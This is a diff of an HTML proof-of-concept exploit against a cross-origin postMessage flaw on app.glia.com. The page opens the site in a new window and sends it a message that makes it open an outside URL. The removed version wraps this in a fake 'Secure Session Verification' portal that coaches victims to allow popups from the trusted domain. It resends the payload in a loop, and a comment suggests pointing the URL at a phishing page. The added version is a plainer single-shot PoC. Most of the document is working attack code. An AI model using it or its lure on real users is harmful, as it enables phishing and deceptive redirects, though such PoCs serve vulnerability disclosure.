@@ -2,75 +2,44 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Verification Portal</title>
+    <title>Exploit Simulation Hub</title>
     <style>
-        body { font-family: sans-serif; padding: 40px; text-align: center; background-color: #f4f6f9; color: #333; }
-        .box { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .btn { padding: 15px 30px; font-size: 18px; background: #ce3021; color: white; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; transition: background 0.2s; }
+        body { font-family: sans-serif; padding: 40px; text-align: center; }
+        .btn { padding: 15px 30px; font-size: 18px; background: #ce3021; color: white; border: none; cursor: pointer; border-radius: 5px; }
         .btn:hover { background: #b0281a; }
-        .instructions { display: none; margin-top: 20px; text-align: left; background: #fff3cd; border-left: 6px solid #ffc107; padding: 15px; border-radius: 4px; }
-        .alert-text { color: #856404; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="box" id="portal-box">
-        <h1>Secure Session Verification</h1>
-        <p>Click the button below to link your secure Glia dashboard and complete the verification step.</p>
-        
-        <!-- Single user click action -->
-        <button class="btn" id="start-btn" onclick="launchExploit()">Verify Secure Dashboard</button>
-
-        <!-- Social Engineering Overlay (Revealed post-click) -->
-        <div class="instructions" id="step-instructions">
-            <p class="alert-text">⚠️ ACTION REQUIRED TO COMPLETE VERIFICATION:</p>
-            <ol>
-                <li>Look at your browser's address bar or top-right corner.</li>
-                <li>You will see a <strong>"Popup Blocked"</strong> notification from the trusted domain <strong>app.glia.com</strong>.</li>
-                <li>Click the notification and select <strong>"Always allow popups from app.glia.com"</strong>.</li>
-            </ol>
-            <p><em>Once allowed, your secure dashboard configuration will synchronize automatically.</em></p>
-        </div>
-    </div>
+    <h1>Cross-Origin PostMessage Payload Delivery</h1>
+    <p>Click the button below to initiate the window reference chain and deliver the payload.</p>
+    
+    <!-- One click requirement satisfied -->
+    <button class="btn" onclick="launchExploit()">Execute Exploit Chain</button>
 
     <script>
         function launchExploit() {
-            // UI Transformation: Hide the button, show the social engineering guide
-            document.getElementById('start-btn').style.display = 'none';
-            document.getElementById('step-instructions').style.display = 'block';
-
-            // 1. Immediately open the target page to secure a valid window reference
+            // 1. Open the target vulnerable page to capture the window object reference
             const targetWindow = window.open('https://app.glia.com/account', '_blank');
 
-            if (!targetWindow) {
-                console.error('[-] Failed to create the initial target window reference.');
-                return;
-            }
-
-            console.log('[+] Target window opened. Initializing postMessage spray loop...');
-
-            // 2. Continuous Delivery Loop
-            // Sprays the postMessage payload every 500ms so it lands the instant the prompt is clicked.
-            const messageInterval = setInterval(function() {
-                try {
+            // 2. We must wait for the target page to load its scripts and register the event listener.
+            // Direct onload checking is blocked by Same-Origin Policy, so we use a polling timeout.
+            setTimeout(function() {
+                if (targetWindow) {
+                    // 3. Construct the payload structure expected by the unverified listener
                     const payload = {
                         type: 'openNewTab',
-                        url: 'https://wrathsec.github.io/postmessage/redirected.html' // Destination domain (or your phishing landing page)
+                        url: 'https://wrathsec.github.io/postmessage/redirected.html' // Destination domain
                     };
 
-                    // Send payload to target window reference
+                    // 4. Dispatch the postMessage to the target window reference.
+                    // '*' is used because we are forcing cross-origin communication.
                     targetWindow.postMessage(payload, '*');
-                    console.log('[*] Spraying payload to target...');
-                } catch (e) {
-                    console.log('[-] Waiting for target availability...');
+                    console.log('[+] Payload successfully dispatched to target window.');
+                } else {
+                    console.error('[-] Popup blocked or window reference lost.');
                 }
-            }, 500);
-
-            // 3. Clear the loop after 20 seconds to prevent endless browser lag
-            setTimeout(function() {
-                clearInterval(messageInterval);
-                console.log('[+] Payload spray sequence completed.');
-            }, 20000);
+            }, 3500); // 3.5-second delay to ensure the target DOM and event listeners are ready
         }
     </script>
 
